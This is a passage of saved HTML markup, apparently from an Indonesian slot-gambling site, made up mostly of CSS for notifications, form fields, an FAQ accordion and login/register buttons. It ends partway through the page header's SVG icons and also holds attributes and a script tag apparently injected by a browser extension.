            position: fixed;
            z-index: var(--snackbar-zindex)
        }

        #vue3-snackbar--container.is-rtl .vue3-snackbar-message-icon {
            margin-left: 16px;
            margin-right: 0
        }

        #vue3-snackbar--container.is-top {
            top: 0
        }

        #vue3-snackbar--container.is-bottom {
            bottom: 0
        }

        #vue3-snackbar--container.is-left {
            left: 0
        }

        #vue3-snackbar--container.is-right {
            right: 0
        }

        #vue3-snackbar--container.is-start {
            inset-inline-start: 0
        }

        #vue3-snackbar--container.is-end {
            inset-inline-end: 0
        }

        #vue3-snackbar--container.is-middle {
            top: 50%;
            transform: translateY(-50%)
        }

        #vue3-snackbar--container.is-centre {
            left: 50%;
            transform: translate(-50%)
        }

        #vue3-snackbar--container.shadow-xs .vue3-snackbar-message {
            box-shadow: 0 1px 2px #0000000d
        }

        #vue3-snackbar--container.shadow-sm .vue3-snackbar-message {
            box-shadow: 0 1px 3px #0000001a, 0 1px 2px -1px #0000001a
        }

        #vue3-snackbar--container.shadow-md .vue3-snackbar-message {
            box-shadow: 0 4px 6px -1px #0000001a, 0 2px 4px -2px #0000001a
        }

        #vue3-snackbar--container.shadow-lg .vue3-snackbar-message {
            box-shadow: 0 10px 15px -3px #0000001a, 0 4px 6px -4px #0000001a
        }

        #vue3-snackbar--container.shadow-xl .vue3-snackbar-message {
            box-shadow: 0 20px 25px -5px #0000001a, 0 8px 10px -6px #0000001a
        }

        #vue3-snackbar--container.shadow-2xl .vue3-snackbar-message {
            box-shadow: 0 25px 50px -12px #00000040
        }

        .vue3-snackbar-message {
            border-radius: 4px;
            color: var(--message-text-color, #fff);
            display: flex;
            margin-bottom: 16px;
            pointer-events: all;
            position: relative
        }

        .vue3-snackbar-message-action {
            display: flex;
            justify-content: flex-end;
            width: 100%
        }

        .vue3-snackbar-message-action:not(:empty) {
            padding-top: .5rem
        }

        .vue3-snackbar-message.has-border {
            background-color: var(--base-background-color, #fff);
            border: 0 solid;
            position: relative
        }

        .vue3-snackbar-message.has-border:before {
            background-color: var(--background-color);
            content: "";
            top: 0;
            right: 0;
            bottom: 0;
            left: 0;
            opacity: var(--background-opacity);
            pointer-events: none;
            position: absolute
        }

        .vue3-snackbar-message.has-border.success {
            color: var(--success-colour)
        }

        .vue3-snackbar-message.has-border.error {
            color: var(--error-colour)
        }

        .vue3-snackbar-message.has-border.info {
            color: var(--info-colour)
        }

        .vue3-snackbar-message.has-border.warning {
            color: var(--warning-colour)
        }

        .vue3-snackbar-message.has-border.has-background {
            color: var(--message-background)
        }

        .vue3-snackbar-message.border-left {
            border-left-width: var(--snackbar-border-width)
        }

        .vue3-snackbar-message.border-left:before {
            border-bottom-right-radius: inherit;
            border-top-right-radius: inherit
        }

        .vue3-snackbar-message.border-right {
            border-right-width: var(--snackbar-border-width)
        }

        .vue3-snackbar-message.border-right:before {
            border-bottom-left-radius: inherit;
            border-top-left-radius: inherit
        }

        .vue3-snackbar-message.border-top {
            border-top-width: var(--snackbar-border-width)
        }

        .vue3-snackbar-message.border-top:before {
            border-bottom-left-radius: inherit;
            border-bottom-right-radius: inherit
        }

        .vue3-snackbar-message.border-bottom {
            border-bottom-width: var(--snackbar-border-width)
        }

        .vue3-snackbar-message.border-bottom:before {
            border-top-left-radius: inherit;
            border-top-right-radius: inherit
        }

        .vue3-snackbar-message.border-start {
            border-inline-start-width: var(--snackbar-border-width)
        }

        .vue3-snackbar-message.border-start:before {
            border-end-end-radius: inherit;
            border-start-end-radius: inherit
        }

        .vue3-snackbar-message.border-end {
            border-inline-end-width: var(--snackbar-border-width)
        }

        .vue3-snackbar-message.border-end:before {
            border-end-start-radius: inherit;
            border-start-start-radius: inherit
        }

        .vue3-snackbar-message.success:not(.has-background):not(.has-border) {
            background-color: var(--success-colour);
            border-color: var(--success-colour)
        }

        .vue3-snackbar-message.error:not(.has-background):not(.has-border) {
            background-color: var(--error-colour);
            border-color: var(--error-colour)
        }

        .vue3-snackbar-message.warning:not(.has-background):not(.has-border) {
            background-color: var(--warning-colour);
            border-color: var(--warning-colour)
        }

        .vue3-snackbar-message.info:not(.has-background):not(.has-border) {
            background-color: var(--info-colour);
            border-color: var(--info-colour)
        }

        .vue3-snackbar-message.has-background:not(.has-border) {
            background-color: var(--message-background);
            border-color: var(--message-background)
        }

        .vue3-snackbar-message-wrapper {
            align-items: center;
            border-radius: inherit;
            display: flex;
            padding: 16px
        }

        .vue3-snackbar-message.is-dense .vue3-snackbar-message-wrapper {
            padding: 8px 16px
        }

        .vue3-snackbar-message-title {
            font-weight: 700;
            position: relative
        }

        .vue3-snackbar-message-additional {
            position: relative
        }

        .vue3-snackbar-message-icon {
            color: var(--message-icon-color, currentColor);
            display: flex;
            margin-right: 16px
        }

        .vue3-snackbar-message-close {
            margin-left: 16px;
            min-width: 30px
        }

        .vue3-snackbar-message-close button {
            appearance: none
        }

        .vue3-snackbar-message-close button:focus:not(:focus-visible) {
            outline: none
        }

        .vue3-snackbar-message-close button:focus:not(:-moz-focusring) {
            outline: none
        }

        .vue3-snackbar-message-close button {
            color: inherit;
            font: inherit;
            -webkit-font-smoothing: inherit;
            -moz-osx-font-smoothing: inherit;
            align-items: center;
            background: 0 0;
            border: none;
            cursor: pointer;
            display: flex;
            height: 30px;
            justify-content: center;
            line-height: normal;
            margin: 0;
            overflow: visible;
            padding: 0;
            position: relative;
            text-align: inherit;
            width: 30px
        }

        .vue3-snackbar-message-close button:before {
            background: currentColor;
            border-radius: 50%;
            content: "";
            top: 0;
            right: 0;
            bottom: 0;
            left: 0;
            opacity: 0;
            pointer-events: none;
            position: absolute;
            transition: opacity .3s ease-in-out
        }

        .vue3-snackbar-message-close button:hover:before {
            opacity: .22
        }

        .vue3-snackbar-message-content {
            display: flex;
            flex-flow: column;
            width: var(--snackbar-content-width)
        }

        .vue3-snackbar-message-badge {
            background: #c10015;
            border: 1px solid #dc143c;
            border-radius: 8px;
            box-shadow: 0 1px 3px #0003, 0 1px 1px #00000024, 0 2px 1px -1px #0000001f;
            color: #fff;
            font-size: .9em;
            font-weight: 700;
            left: 0;
            padding: .125em .5em;
            position: absolute;
            top: 0;
            transform: translate(-25%, -25%)
        }

        .vue3-snackbar-message.border-left .vue3-snackbar-message-badge {
            left: 0;
            top: -5px
        }

        .vue3-snackbar-message-enter-from {
            opacity: 0;
            transform: translateY(50%)
        }

        .vue3-snackbar-message-leave-from {
            max-height: 1000px
        }

        .vue3-snackbar .vue3-snackbar-message.vue3-snackbar-message-leave-to {
            margin-bottom: 0;
            max-height: 0;
            opacity: 0;
            overflow: hidden
        }

        .vue3-snackbar .vue3-snackbar-message.vue3-snackbar-message-leave-to .vue3-snackbar-message-badge {
            opacity: 0
        }

        .vue3-snackbar-message-enter-active {
            transition: transform .3s, opacity .3s
        }

        .vue3-snackbar-message-leave-active {
            transition: max-height .45s cubic-bezier(0, 1, 0, 1), opacity .3s, margin-bottom .3s
        }

        @keyframes headShake {
            0% {
                transform: translate(-25%, -25%)
            }

            6.5% {
                transform: translate(calc(-25% - 6px), -25%)rotateY(-9deg)
            }

            18.5% {
                transform: translate(calc(5px - 25%), -25%)rotateY(7deg)
            }

            31.5% {
                transform: translate(calc(-25% - 3px), -25%)rotateY(-5deg)
            }

            43.5% {
                transform: translate(calc(2px - 25%), -25%)rotateY(3deg)
            }

            50% {
                transform: translate(-25%, -25%)
            }
        }

        .shake-baby-shake .vue3-snackbar-message-badge {
            animation-duration: 1s;
            animation-fill-mode: both;
            animation-name: headShake;
            animation-timing-function: ease-in-out
        }
    </style>
    <style>
        .vue-map {
            height: 100%;
            min-height: 2rem;
            width: 100%
        }
    </style>
    <style>
        .nuxt-icon svg {
            height: 1em;
            margin-bottom: .125em;
            vertical-align: middle;
            width: 1em
        }

        .nuxt-icon.nuxt-icon--fill,
        .nuxt-icon.nuxt-icon--fill * {
            fill: currentColor !important
        }

        .nuxt-icon.nuxt-icon--stroke,
        .nuxt-icon.nuxt-icon--stroke * {
            stroke: currentColor !important
        }
    </style>
    <style>
        #vue3-snackbar--container {
            box-shadow: none !important
        }

        #vue3-snackbar--container.is-top {
            top: 110px !important
        }

        #vue3-snackbar--container.has-shadow .vue3-snackbar-message,
        #vue3-snackbar--container.shadow-md .vue3-snackbar-message {
            box-shadow: none !important
        }

        .custom-snackbar {
            align-items: center;
            border-radius: .75rem;
            border-width: 1px;
            display: flex;
            gap: 1rem;
            min-width: 18rem;
            padding: 10px 1.25rem;
            position: relative
        }

        @media (min-width:768px) {
            .custom-snackbar {
                min-width: 400px
            }
        }

        .custom-snackbar.success {
            --tw-border-opacity: 1;
            border-color: rgb(29 153 120/var(--tw-border-opacity, 1));
            --tw-bg-opacity: 1;
            background-color: rgb(246 255 249/var(--tw-bg-opacity, 1))
        }

        .custom-snackbar.danger {
            --tw-border-opacity: 1;
            border-color: rgb(236 33 61/var(--tw-border-opacity, 1));
            --tw-bg-opacity: 1;
            background-color: rgb(249 188 197/var(--tw-bg-opacity, 1))
        }

        .custom-snackbar.warning {
            --tw-border-opacity: 1;
            border-color: rgb(247 166 51/var(--tw-border-opacity, 1));
            --tw-bg-opacity: 1;
            background-color: rgb(253 228 194/var(--tw-bg-opacity, 1))
        }
    </style>
    <style>
        .wrapper-default[data-v-fd28e93b] input:not([type=checkbox]):not([type=radio]):not(.vs__search),
        .wrapper-default[data-v-fd28e93b] textarea {
            border-color: transparent;
            font-weight: 500;
            padding: 0;
            pointer-events: none;
            width: 100%
        }

        .wrapper-default[data-v-fd28e93b] input:not([type=checkbox]):not([type=radio]):not(.vs__search):focus,
        .wrapper-default[data-v-fd28e93b] textarea:focus {
            border-color: transparent;
            --tw-ring-offset-shadow: var(--tw-ring-inset) 0 0 0 var(--tw-ring-offset-width) var(--tw-ring-offset-color);
            --tw-ring-shadow: var(--tw-ring-inset) 0 0 0 calc(var(--tw-ring-offset-width)) var(--tw-ring-color);
            box-shadow: var(--tw-ring-offset-shadow), var(--tw-ring-shadow), var(--tw-shadow, 0 0 #0000)
        }

        .wrapper-rounded[data-v-fd28e93b] .dp__input,
        .wrapper-rounded[data-v-fd28e93b] input:not([type=checkbox]):not([type=radio]):not(.vs__search):not(.dp__input):not(.not-wrapped),
        .wrapper-rounded[data-v-fd28e93b] textarea {
            border-radius: 9999px;
            border-width: 1px;
            width: 100%;
            --tw-border-opacity: 1;
            border-color: rgb(158 158 158/var(--tw-border-opacity, 1));
            padding: .75rem 1rem
        }

        .wrapper-rounded[data-v-fd28e93b] .dp__input::-moz-placeholder,
        .wrapper-rounded[data-v-fd28e93b] input:not([type=checkbox]):not([type=radio]):not(.vs__search):not(.dp__input):not(.not-wrapped)::-moz-placeholder,
        .wrapper-rounded[data-v-fd28e93b] textarea::-moz-placeholder {
            --tw-text-opacity: 1;
            color: rgb(134 134 134/var(--tw-text-opacity, 1))
        }

        .wrapper-rounded[data-v-fd28e93b] .dp__input::placeholder,
        .wrapper-rounded[data-v-fd28e93b] input:not([type=checkbox]):not([type=radio]):not(.vs__search):not(.dp__input):not(.not-wrapped)::placeholder,
        .wrapper-rounded[data-v-fd28e93b] textarea::placeholder {
            --tw-text-opacity: 1;
            color: rgb(134 134 134/var(--tw-text-opacity, 1))
        }

        .wrapper-rounded[data-v-fd28e93b] .dp__input:focus,
        .wrapper-rounded[data-v-fd28e93b] input:not([type=checkbox]):not([type=radio]):not(.vs__search):not(.dp__input):not(.not-wrapped):focus,
        .wrapper-rounded[data-v-fd28e93b] textarea:focus {
            --tw-border-opacity: 1;
            border-color: rgb(0 90 171/var(--tw-border-opacity, 1));
            --tw-ring-offset-shadow: var(--tw-ring-inset) 0 0 0 var(--tw-ring-offset-width) var(--tw-ring-offset-color);
            --tw-ring-shadow: var(--tw-ring-inset) 0 0 0 calc(var(--tw-ring-offset-width)) var(--tw-ring-color);
            box-shadow: var(--tw-ring-offset-shadow), var(--tw-ring-shadow), var(--tw-shadow, 0 0 #0000)
        }

        .wrapper-rounded[data-v-fd28e93b] .dp__input:disabled,
        .wrapper-rounded[data-v-fd28e93b] input:not([type=checkbox]):not([type=radio]):not(.vs__search):not(.dp__input):not(.not-wrapped):disabled,
        .wrapper-rounded[data-v-fd28e93b] textarea:disabled {
            border-color: transparent;
            --tw-bg-opacity: 1;
            background-color: rgb(242 242 242/var(--tw-bg-opacity, 1));
            --tw-text-opacity: 1;
            color: rgb(128 128 128/var(--tw-text-opacity, 1))
        }

        .wrapper-rounded[data-v-fd28e93b] .dp__input:-webkit-autofill,
        .wrapper-rounded[data-v-fd28e93b] .dp__input:-webkit-autofill:focus,
        .wrapper-rounded[data-v-fd28e93b] .dp__input:-webkit-autofill:hover,
        .wrapper-rounded[data-v-fd28e93b] input:not([type=checkbox]):not([type=radio]):not(.vs__search):not(.dp__input):not(.not-wrapped):-webkit-autofill,
        .wrapper-rounded[data-v-fd28e93b] input:not([type=checkbox]):not([type=radio]):not(.vs__search):not(.dp__input):not(.not-wrapped):-webkit-autofill:focus,
        .wrapper-rounded[data-v-fd28e93b] input:not([type=checkbox]):not([type=radio]):not(.vs__search):not(.dp__input):not(.not-wrapped):-webkit-autofill:hover,
        .wrapper-rounded[data-v-fd28e93b] textarea:-webkit-autofill,
        .wrapper-rounded[data-v-fd28e93b] textarea:-webkit-autofill:focus,
        .wrapper-rounded[data-v-fd28e93b] textarea:-webkit-autofill:hover {
            -webkit-box-shadow: inset 0 0 0 1000px #fff !important;
            -webkit-text-fill-color: #000 !important;
            outline: none
        }

        .wrapper-rounded[data-v-fd28e93b] textarea {
            border-radius: .5rem
        }

        .wrapper-rounded.error[data-v-fd28e93b] .dp__input,
        .wrapper-rounded.error[data-v-fd28e93b] input:not([type=checkbox]):not([type=radio]):not(.vs__search):not(.dp__input):not(.not-wrapped),
        .wrapper-rounded.error[data-v-fd28e93b] textarea {
            --tw-border-opacity: 1;
            border-color: rgb(236 33 61/var(--tw-border-opacity, 1));
            --tw-bg-opacity: 1;
            background-color: rgb(253 227 228/var(--tw-bg-opacity, 1));
            --tw-text-opacity: 1;
            color: rgb(202 45 51/var(--tw-text-opacity, 1))
        }

        .wrapper-rounded.error[data-v-fd28e93b] .not-wrapped:-webkit-autofill,
        .wrapper-rounded.error[data-v-fd28e93b] .not-wrapped:-webkit-autofill:focus,
        .wrapper-rounded.error[data-v-fd28e93b] .not-wrapped:-webkit-autofill:hover {
            -webkit-box-shadow: inset 0 0 0 1000px #fde3e4 !important;
            outline: none
        }
    </style>
    <style>
        .border-b-6[data-v-f6f73e9b] {
            border-bottom-width: 6px
        }
    </style>
    <style>
        .modal-full[data-v-a459e78e] {
            padding-left: 0 !important;
            padding-right: 0 !important;
            z-index: 1
        }

        .modal-full[data-v-a459e78e]>* {
            height: 100%;
            justify-content: center;
            max-width: 100%
        }
    </style>
    <style>
        .menu.router-link-active[data-v-7aa7f30f],
        .menu.router-link-exact-active[data-v-7aa7f30f] {
            --tw-text-opacity: 1;
            color: rgb(0 90 171/var(--tw-text-opacity, 1))
        }

        .submenu.router-link-active[data-v-7aa7f30f],
        .submenu.router-link-exact-active[data-v-7aa7f30f] {
            --tw-bg-opacity: 1;
            background-color: rgb(229 239 247/var(--tw-bg-opacity, 1));
            --tw-text-opacity: 1;
            color: rgb(0 90 171/var(--tw-text-opacity, 1))
        }
    </style>
    <style>
        .custom-scroll[data-v-57341a5c]::-webkit-scrollbar {
            width: 5px
        }

        .custom-scroll[data-v-57341a5c]::-webkit-scrollbar-track {
            background: #eaeaea;
            border-radius: 10px
        }

        .custom-scroll[data-v-57341a5c]::-webkit-scrollbar-thumb {
            background: #cdcdcd;
            border-radius: 10px
        }
    </style>
    <style>
        .count-icon {
            align-items: center;
            border-radius: 9999px;
            display: flex;
            height: 16px;
            justify-content: center;
            width: 16px;
            --tw-bg-opacity: 1;
            background-color: rgb(236 33 61/var(--tw-bg-opacity, 1));
            font-size: 9px;
            --tw-text-opacity: 1;
            color: rgb(255 255 255/var(--tw-text-opacity, 1))
        }
    </style>
    <style>
        .link-footer[data-v-6f6249f3] {
            --tw-text-opacity: 1;
            color: rgb(37 37 37/var(--tw-text-opacity, 1))
        }

        .link-footer[data-v-6f6249f3]:hover {
            opacity: .8
        }
    </style>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600;700&display=swap');

        .faq-section {
            max-width: 1166px;
            margin: 60px auto;
            padding: 50px 30px;
            position: relative;
            background: rgb(255, 255, 255);
            backdrop-filter: blur(20px);
            border-radius: 25px;
            border: 1px solid rgb(255, 255, 255);
            font-family: "Poppins", sans-serif;
            box-shadow: 0 0 20px rgba(0, 0, 0, 0.26);
            overflow: hidden;
        }

        /* Decorative Glow Element */
        .faq-section::before {
            content: "";
            position: absolute;
            top: -50px;
            left: 50%;
            transform: translateX(-50%);
            width: 60%;
            height: 100px;
            background: radial-gradient(circle, rgba(255, 255, 255, 0.4) 0%, transparent 90%);
            filter: blur(40px);
            z-index: 0;
            pointer-events: none;
        }

        .faq-section h2 {
            text-align: center;
            font-size: 38px;
            font-weight: 800;
            margin-bottom: 50px;
            color: #686868;
            text-transform: uppercase;
            letter-spacing: 2px;
            position: relative;
            z-index: 1;
            background: linear-gradient(to right, #e5013e, #e5013e, #e5013e);
            background-clip: text;
            -webkit-text-fill-color: transparent;
            background-size: 200% auto;
            animation: shine 5s linear infinite;
        }

        @keyframes shine {
            to {
                background-position: 200% center;
            }
        }

        .faq-container {
            display: flex;
            flex-direction: column;
            gap: 20px;
            position: relative;
            z-index: 1;
        }

        .faq-item {
            background: rgba(0, 0, 0, 0.03);
            border: 1px solid rgb(0, 0, 0);
            border-radius: 16px;
            transition: all 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
            overflow: hidden;
        }

        .faq-item:hover {
            border-color: #000000;
            background: rgba(255, 196, 0, 0.05);
            transform: translateY(-5px);
            box-shadow: 0 10px 30px rgb(255, 255, 255);
        }

        .faq-item.active {
            background: linear-gradient(145deg, rgba(20, 20, 20, 1), rgba(40, 40, 40, 1));
            border-color: #000000;
            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.6);
        }

        .faq-question {
            width: 100%;
            padding: 25px 30px;
            background: transparent;
            color: #000000;
            font-size: 18px;
            font-weight: 600;
            text-align: left;
            border: none;
            cursor: pointer;
            display: flex;
            justify-content: space-between;
            align-items: center;
            font-family: "Poppins", sans-serif;
            transition: color 0.3s ease;
        }

        .faq-item.active .faq-question {
            color: #ffffff;
        }

        .icon-wrapper {
            position: relative;
            width: 30px;
            height: 30px;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .icon-bar {
            position: absolute;
            background-color: #ffffff;
            border-radius: 2px;
            transition: all 0.4s ease;
        }

        .icon-bar.horizontal {
            width: 100%;
            height: 3px;
        }

        .icon-bar.vertical {
            width: 3px;
            height: 100%;
        }

        .faq-item.active .icon-bar.vertical {
            transform: rotate(90deg);
            opacity: 0;
        }

        .faq-item.active .icon-bar.horizontal {
            transform: rotate(180deg);
        }

        .faq-answer {
            max-height: 0;
            overflow: hidden;
            transition: max-height 0.5s cubic-bezier(0, 1, 0, 1);
            padding: 0 30px;
            opacity: 0;
        }

        .faq-item.active .faq-answer {
            max-height: 500px;
            /* Adjust if content is longer */
            padding-bottom: 30px;
            opacity: 1;
            transition: all 0.5s ease-in-out;
        }

        .faq-answer p {
            color: #b0b0b0;
            font-size: 15px;
            line-height: 1.8;
            margin: 0;
            padding-top: 10px;
            border-top: 1px dashed rgba(255, 255, 255, 0.1);
        }

        @media (max-width: 768px) {
            .faq-section {
                padding: 30px 15px;
                margin: 30px 10px;
            }

            .faq-section h2 {
                font-size: 26px;
            }

            .faq-question {
                padding: 20px;
                font-size: 16px;
            }

            .faq-answer {
                padding: 0 20px;
            }
        }
    </style>
    <style>
        .AGENSLOT {
            display: grid;
            grid-template-columns: repeat(2, 1fr);
            font-weight: 700;
        }

        .AGENSLOT a {
            text-align: center;
        }

        .login,
        .register {
            color: #ffffff;
            padding: 13px 10px;
        }

        .login,
        .login-button {
            border: 1px solid #357fc9;
            background: linear-gradient(to bottom, #df0a0ae7 0, #380c0cce 100%);
            border: 1px solid #f4feff;
        }

        .register,
        .register-button {
            background: linear-gradient(to bottom, #df0a0ae7 0, #380c0cce 100%);
            border: 1px solid #f4feff;
        }
    </style>
    <script bis_use="true" type="text/javascript" charset="utf-8"
        data-bis-config="[&quot;facebook.com/&quot;,&quot;twitter.com/&quot;,&quot;youtube-nocookie.com/embed/&quot;,&quot;//vk.com/&quot;,&quot;//www.vk.com/&quot;,&quot;linkedin.com/&quot;,&quot;//www.linkedin.com/&quot;,&quot;//instagram.com/&quot;,&quot;//www.instagram.com/&quot;,&quot;//www.google.com/recaptcha/api2/&quot;,&quot;//hangouts.google.com/webchat/&quot;,&quot;//www.google.com/calendar/&quot;,&quot;//www.google.com/maps/embed&quot;,&quot;spotify.com/&quot;,&quot;soundcloud.com/&quot;,&quot;//player.vimeo.com/&quot;,&quot;//disqus.com/&quot;,&quot;//tgwidget.com/&quot;,&quot;//js.driftt.com/&quot;,&quot;friends2follow.com&quot;,&quot;/widget&quot;,&quot;login&quot;,&quot;//video.bigmir.net/&quot;,&quot;blogger.com&quot;,&quot;//smartlock.google.com/&quot;,&quot;//keep.google.com/&quot;,&quot;/web.tolstoycomments.com/&quot;,&quot;moz-extension://&quot;,&quot;chrome-extension://&quot;,&quot;/auth/&quot;,&quot;//analytics.google.com/&quot;,&quot;adclarity.com&quot;,&quot;paddle.com/checkout&quot;,&quot;hcaptcha.com&quot;,&quot;recaptcha.net&quot;,&quot;2captcha.com&quot;,&quot;accounts.google.com&quot;,&quot;www.google.com/shopping/customerreviews&quot;,&quot;buy.tinypass.com&quot;,&quot;gstatic.com&quot;,&quot;secureir.ebaystatic.com&quot;,&quot;docs.google.com&quot;,&quot;contacts.google.com&quot;,&quot;github.com&quot;,&quot;mail.google.com&quot;,&quot;chat.google.com&quot;,&quot;audio.xpleer.com&quot;,&quot;keepa.com&quot;,&quot;static.xx.fbcdn.net&quot;,&quot;sas.selleramp.com&quot;,&quot;1plus1.video&quot;,&quot;console.googletagservices.com&quot;,&quot;//lnkd.demdex.net/&quot;,&quot;//radar.cedexis.com/&quot;,&quot;//li.protechts.net/&quot;,&quot;challenges.cloudflare.com/&quot;,&quot;ogs.google.com&quot;]"
        src="chrome-extension://eppiocemhmnlbhjplcgkofciiegomcon/executors/traffic.js"></script>
</head>

<body __processed_a3282393-e6be-4c30-b556-0a0dfbe42033__="true"
    bis_register="W3sibWFzdGVyIjp0cnVlLCJleHRlbnNpb25JZCI6ImVwcGlvY2VtaG1ubGJoanBsY2drb2ZjaWllZ29tY29uIiwiYWRibG9ja2VyU3RhdHVzIjp7IkRJU1BMQVkiOiJkaXNhYmxlZCIsIkZBQ0VCT09LIjoiZGlzYWJsZWQiLCJUV0lUVEVSIjoiZGlzYWJsZWQiLCJSRURESVQiOiJkaXNhYmxlZCIsIlBJTlRFUkVTVCI6ImRpc2FibGVkIiwiSU5TVEFHUkFNIjoiZGlzYWJsZWQiLCJUSUtUT0siOiJkaXNhYmxlZCIsIkxJTktFRElOIjoiZGlzYWJsZWQiLCJDT05GSUciOiJkaXNhYmxlZCJ9LCJ2ZXJzaW9uIjoiMi4wLjM1Iiwic2NvcmUiOjIwMDM1fV0=">
    <!--teleport start anchor-->
    <section id="vue3-snackbar--container" class="vue3-snackbar is-top is-centre shadow-md"
        style="--success-colour:#4caf50;--error-colour:#ff5252;--warning-colour:#fb8c00;--info-colour:#f32121;--snackbar-zindex:9999;--background-opacity:0.12;--background-color:currentColor;--base-background-color:#ffffff;--message-text-color:#fff;--message-icon-color:currentColor;--snackbar-content-width:min(50vw, 350px);--snackbar-border-width:8px;"
        aria-live="polite">
        <div class="vue3-snackbar--messages" bis_skin_checked="1"></div>
    </section>
    <!--teleport anchor-->
    <div id="__nuxt" bis_skin_checked="1">
        <div bis_skin_checked="1">
            <div bis_skin_checked="1">
                <!--[-->
                <header class="fixed top-0 z-10 flex h-32 w-full flex-col border-b bg-white md:h-[112px] h-32">
                    <div class="flex max-h-[42px] items-center bg-secondary-900 py-[11px] max-md:hidden"
                        bis_skin_checked="1">
                        <div class="container flex items-center justify-between" bis_skin_checked="1">
                            <div class="flex gap-4" bis_skin_checked="1"><a href="https://otiumpro.com/clientes/"
                                    class="flex items-center gap-2"><span class="nuxt-icon nuxt-icon--fill text-xl"><svg
                                            width="24" height="24" viewBox="0 0 24 24" fill="none"
                                            xmlns="http://www.w3.org/2000/svg">
                                            <path
                                                d="M22 17.002C21.9996 18.3696 21.5321 19.696 20.675 20.7616C19.8179 21.8273 18.6226 22.5683 17.287 22.862L16.649 20.948C17.2332 20.8518 17.7888 20.6271 18.2758 20.2903C18.7627 19.9534 19.1689 19.5128 19.465 19H17C16.4696 19 15.9609 18.7893 15.5858 18.4142C15.2107 18.0391 15 17.5304 15 17V13C15 12.4696 15.2107 11.9609 15.5858 11.5858C15.9609 11.2107 16.4696 11 17 11H19.938C19.694 9.0669 18.7529 7.28927 17.2914 6.00068C15.8299 4.71208 13.9484 4.00108 12 4.00108C10.0516 4.00108 8.17007 4.71208 6.70857 6.00068C5.24708 7.28927 4.30603 9.0669 4.062 11H7C7.53043 11 8.03914 11.2107 8.41421 11.5858C8.78929 11.9609 9 12.4696 9 13V17C9 17.5304 8.78929 18.0391 8.41421 18.4142C8.03914 18.7893 7.53043 19 7 19H4C3.46957 19 2.96086 18.7893 2.58579 18.4142C2.21071 18.0391 2 17.5304 2 17V12C2 6.477 6.477 2 12 2C17.523 2 22 6.477 22 12V17V17.002ZM20 17V13H17V17H20ZM4 13V17H7V13H4Z"
                                                fill="#252525"></path>
                                        </svg>
                                    </span><span class="text-sm font-medium">Bantuan</span></a><a
                                    href="https://otiumpro.com/clientes/" rel="noopener noreferrer" target="_blank"
                                    class="flex items-center gap-2"><span class="nuxt-icon nuxt-icon--fill text-lg"><svg
                                            width="18" height="18" viewBox="0 0 18 18" fill="none"
                                            xmlns="http://www.w3.org/2000/svg">
                                            <path
                                                d="M16.944 16.1938L17.0212 16.1978C17.3993 16.2362 17.694 16.5555 17.694 16.9438C17.694 17.3322 17.3993 17.6515 17.0212 17.6899L16.944 17.6938H1.66667C1.25245 17.6938 0.916668 17.3581 0.916668 16.9438C0.916668 16.5296 1.25245 16.1938 1.66667 16.1938H16.944Z"
                                                fill="black"></path>
                                            <path
                                                d="M14.6667 16.944V8.54167C14.6667 8.12745 15.0025 7.79167 15.4167 7.79167C15.8309 7.79167 16.1667 8.12745 16.1667 8.54167V16.944C16.1667 17.3582 15.8309 17.694 15.4167 17.694C15.0025 17.694 14.6667 17.3582 14.6667 16.944Z"
                                                fill="black"></path>
                                            <path
                                                d="M2.44474 16.944V8.54167C2.44474 8.12745 2.78053 7.79167 3.19474 7.79167C3.60896 7.79167 3.94474 8.12745 3.94474 8.54167V16.944C3.94474 17.3582 3.60896 17.694 3.19474 17.694C2.78053 17.694 2.44474 17.3582 2.44474 16.944Z"
                                                fill="black"></path>
                                            <path
                                                d="M12.7642 0.916666C13.2082 0.916666 13.5982 0.915468 13.9214 0.948892C14.2618 0.984097 14.5912 1.06217 14.9058 1.25651C15.2204 1.45095 15.4379 1.71093 15.6216 1.99967C15.7089 2.13691 15.7962 2.29316 15.8863 2.46452L16.1685 3.02018L16.1949 3.07975L17.2671 5.79069L17.3658 6.05143C17.464 6.32759 17.5555 6.64649 17.5884 6.97428C17.6279 7.36768 17.5867 7.8253 17.3296 8.24577L17.2056 8.4235C16.7897 8.95084 16.1428 9.29167 15.4165 9.29167C14.8277 9.29164 14.2925 9.06659 13.8882 8.69987C13.484 9.06624 12.9494 9.29167 12.3609 9.29167C11.7721 9.29161 11.2378 9.0656 10.8335 8.69889C10.4292 9.06578 9.89422 9.29167 9.30522 9.29167C8.71642 9.29159 8.18212 9.06561 7.77787 8.69889C7.37354 9.06575 6.83852 9.29167 6.24955 9.29167C5.66079 9.29156 5.12644 9.06562 4.72221 8.69889C4.31798 9.06562 3.78363 9.29156 3.19486 9.29167C2.55935 9.29167 1.98421 9.03055 1.57182 8.61198L1.40483 8.4235C1.03753 7.95754 0.976884 7.42382 1.02201 6.97428C1.06591 6.53713 1.21558 6.11605 1.34428 5.79069L2.41654 3.07975L2.44291 3.02018L2.72514 2.46452C2.8152 2.2932 2.90248 2.13688 2.98979 1.99967C3.17349 1.71104 3.39016 1.45091 3.70463 1.25651L3.82377 1.18913C4.10233 1.04342 4.39201 0.979701 4.68998 0.948892C5.01322 0.915484 5.40326 0.916666 5.84721 0.916666H12.7642ZM5.84721 2.41667C5.37251 2.41667 5.0727 2.41748 4.84428 2.44108C4.68571 2.45747 4.59827 2.48207 4.54154 2.50749L4.49369 2.53288C4.43923 2.56654 4.3693 2.62638 4.25541 2.80534C4.1346 2.9952 4.00243 3.25573 3.7974 3.66569L2.73881 6.34245C2.62 6.64284 2.53737 6.90344 2.51518 7.1237C2.49428 7.33184 2.53405 7.43203 2.58354 7.49479L2.64018 7.56022C2.78193 7.70417 2.97834 7.79167 3.19486 7.79167C3.62408 7.79143 3.97197 7.44355 3.97221 7.01432C3.97221 6.60011 4.30799 6.26432 4.72221 6.26432C5.11052 6.26432 5.42988 6.559 5.4683 6.93717L5.47221 7.01432L5.47611 7.09342C5.51593 7.4855 5.84703 7.79145 6.24955 7.79167C6.67897 7.79167 7.02764 7.44369 7.02787 7.01432C7.02787 6.60011 7.36366 6.26432 7.77787 6.26432C8.16614 6.26438 8.48555 6.55903 8.52397 6.93717L8.52787 7.01432L8.53178 7.09342C8.5716 7.48554 8.90264 7.79151 9.30522 7.79167C9.73465 7.79167 10.0833 7.4437 10.0835 7.01432C10.0835 6.60011 10.4193 6.26432 10.8335 6.26432C11.2218 6.26444 11.5412 